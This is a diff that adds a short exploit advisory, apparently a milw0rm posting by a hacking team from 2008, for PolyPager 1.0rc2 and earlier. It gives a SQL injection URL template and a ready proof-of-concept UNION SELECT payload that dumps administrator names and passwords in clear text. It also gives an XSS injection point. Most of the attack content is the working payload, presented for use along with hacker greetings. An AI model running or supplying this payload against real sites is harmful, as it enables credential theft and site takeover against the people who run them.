@@ -1,0 +1,59 @@
+=================================================================
+  PolyPager <= 1.0rc2 (SQL/XSS) Multiple Remote Vulnerabilities
+=================================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 26 June 2008
+SITE   : cwh.citec.us
+
+
+#####################################################
+ APPLICATION : PolyPager
+ VERSION     : <= 1.0rc2
+ VENDOR      : http://polypager.nicolashoening.de/
+ DOWNLOAD    : http://downloads.sourceforge.net/polypager
+#####################################################
+
+--- Remote SQL Injection (nr) ---
+
+---------
+ Exploit
+---------
+
+[+] http://[Target]/[polypager_path]/?[Web Page]&nr=[SQL Injection]
+
+This exploit can dump username and password in clear text
+
+-------------
+ POC Exploit
+-------------
+
+[+] http://192.168.24.25/polypager/?Test&nr=-999/**/UNION/**/SELECT/**/1,2,3,4,admin_name,admin_pass,7,8,9,10/**/FROM/**/_sys_sys--
+
+
+--- Remote XSS ---
+
+---------
+ Exploit
+---------
+
+[+] http://[Target]/polypager/?[Web Page]&nr=[XSS]
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-26]
